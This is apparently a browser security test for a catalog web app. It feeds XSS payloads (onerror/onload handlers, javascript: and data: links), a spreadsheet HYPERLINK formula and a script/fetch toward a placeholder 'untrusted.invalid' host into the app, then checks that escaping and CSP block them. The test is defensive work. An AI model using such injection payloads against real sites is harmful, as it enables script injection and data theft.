const assert = require('node:assert/strict');
const fs = require('node:fs');
const { database } = require('../supabase/local-database.cjs');
const { createServer, settle, chromium } = require('./browser-helpers.cjs');
const { readWorkbook } = require('./excel-helpers.cjs');

(async () => {
  const db = await database(), server = createServer({ catalogProvider: 'supabase' });
  let browser;
  try {
    const snapshot = (await db.query('SELECT catalog.read_snapshot() AS value')).rows[0].value;
    const entry = snapshot.business_object.find(row => row.identifier === 'gebaeude');
    const payload = 'Security <img id="catalog-injection" src=x onerror="window.catalogXss=1">';
    entry.name_de = payload;
    entry.description_de = '<svg onload="window.catalogXss=1">Catalog text</svg>';
    entry.documentation_links = [{ url: 'javascript:window.catalogXss=1' }, { url: 'data:text/html,<script>window.catalogXss=1</script>' }, { url: 'https://example.org/documentation' }];
    const formula = '=HYPERLINK("https://untrusted.invalid","open")';
    snapshot.business_attribute.find(row => row.business_object_id === entry.id).name_de = formula;
    await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
    browser = await chromium.launch({ channel: process.env.PLAYWRIGHT_CHANNEL || (process.platform === 'win32' ? 'msedge' : undefined), headless: true });
    const page = await browser.newPage({ viewport: { width: 1600, height: 1000 } });
    const errors = [], foreignRequests = [];
    page.on('pageerror', error => errors.push(error.message));
    await page.addInitScript(() => {
      window.securityViolations = [];
      document.addEventListener('securitypolicyviolation', event => window.securityViolations.push(event.violatedDirective));
    });
    await page.route('https://untrusted.invalid/**', route => { foreignRequests.push(route.request().url()); return route.abort(); });
    let redirect = false, redirectedRequests = 0;
    await page.route('https://zicluerzbevodlmtbxow.supabase.co/rest/v1/**', route => {
      if (route.request().url().endsWith('/redirect-target')) { redirectedRequests++; return route.fulfill({ json: {} }); }
      return redirect ? route.fulfill({ status: 307, headers: { Location: '/rest/v1/redirect-target' } }) : route.fulfill({ json: snapshot });
    });
    const base = `http://127.0.0.1:${server.address().port}/`;
    const visit = async hash => { await page.goto(base + hash); await page.locator('#page-content h1').waitFor(); await settle(page); };
    for (const hash of ['#/objects/gebaeude', '#/objects/gebaeude?tab=rows', '#/objects/gebaeude?tab=relations', '#/objects?view=table', '#/objects?view=tiles', '#/search?q=Security', '#/manual']) {
      await visit(hash);
      assert.equal(await page.locator('#catalog-injection, #main svg[onload], #main a[href^="javascript:"], #main a[href^="data:"]').count(), 0, hash);
      assert.equal(await page.evaluate(() => window.catalogXss), undefined);
      assert.deepEqual(await page.evaluate(() => window.securityViolations), [], hash + ': safe rendering does not rely on CSP to escape content');
    }
    await visit('#/objects/gebaeude');
    assert.equal(await page.locator('#page-content h1').textContent(), payload);
    assert.equal(await page.locator('a[href="https://example.org/documentation"]').count(), 1);
    let externalHeaders;
    await page.context().route('https://example.org/documentation', route => {
      externalHeaders = route.request().headers();
      return route.fulfill({ contentType: 'text/html', body: '<!doctype html><title>Documentation fixture</title>' });
    });
    const popupEvent = page.waitForEvent('popup');
    await page.locator('a[href="https://example.org/documentation"]').click();
    const popup = await popupEvent; await popup.waitForLoadState();
    assert.equal(externalHeaders.referer, undefined, 'Documentation requests do not disclose the app URL');
    assert.equal(await popup.evaluate(() => window.opener), null);
    await popup.close();
    const excelDownload = page.waitForEvent('download');
    await page.click('[data-menu="actions"]'); await page.click('[data-export="xlsx"]');
    const workbook = await readWorkbook(await (await excelDownload).path());
    let literalFound = false;
    workbook.eachSheet(sheet => sheet.eachRow(row => row.eachCell(cell => {
      assert.equal(cell.formula, undefined, 'Untrusted strings must not become spreadsheet formulas');
      if (cell.value === formula) literalFound = true;
    })));
    assert(literalFound, 'Formula-like attribute name is retained as literal text');
    await page.waitForFunction(() => !DK.app.state.exporting);
    await page.click('.ob-page-actions > [data-export="diagram-pdf"]');
    await page.locator('#diagram-sheets svg').first().waitFor();
    assert.equal(await page.locator('#diagram-sheets script, #diagram-sheets [onerror], #diagram-sheets [onload]').count(), 0);
    const pdfDownload = page.waitForEvent('download');
    await page.click('[data-diagram-action="download"]');
    const pdf = fs.readFileSync(await (await pdfDownload).path());
    assert.equal(pdf.subarray(0, 5).toString(), '%PDF-');
    assert(pdf.length > 10000);
    await page.waitForFunction(() => document.getElementById('diagram-busy').hidden);
    assert.deepEqual(errors, []);
    assert.deepEqual(await page.evaluate(() => window.securityViolations), [], 'Excel and vector PDF work under CSP');

    redirect = true;
    assert.equal(await page.evaluate(async () => {
      try { await DK.catalog.load(DK.catalogConfig); return false; } catch { return true; }
    }), true);
    assert.equal(redirectedRequests, 0, 'Key-bearing snapshot requests must not follow redirects');
    const originalBase = await page.evaluate(() => document.baseURI);
    await page.evaluate(async () => {
      const script = document.createElement('script'); script.textContent = 'window.catalogXss=1'; document.head.append(script);
      const external = document.createElement('script'); external.src = 'https://untrusted.invalid/code.js'; document.head.append(external);
      const base = document.createElement('base'); base.href = 'https://untrusted.invalid/'; document.head.append(base);
      try { await fetch('https://untrusted.invalid/collect'); } catch { /* Expected CSP rejection. */ }
    });
    await page.waitForFunction(() => window.securityViolations.length >= 4);
    assert.equal(await page.evaluate(() => window.catalogXss), undefined);
    assert.equal(await page.evaluate(() => document.baseURI), originalBase);
    assert.equal(foreignRequests.length, 0);
    const violations = await page.evaluate(() => window.securityViolations);
    assert(violations.includes('script-src-elem') && violations.includes('connect-src') && violations.includes('base-uri'));
    assert.equal(await page.locator('meta[name="referrer"]').getAttribute('content'), 'no-referrer');
    console.log('PASS: hostile SQL metadata across seven views, safe links, literal XLSX formulas, vector PDF under CSP, blocked inline/external scripts and connections, base-URL protection and redirect refusal.');
  } finally {
    if (browser) await browser.close();
    await new Promise(resolve => server.close(resolve));
    await db.close();
  }
})().catch(error => { console.error(error); process.exitCode = 1; });
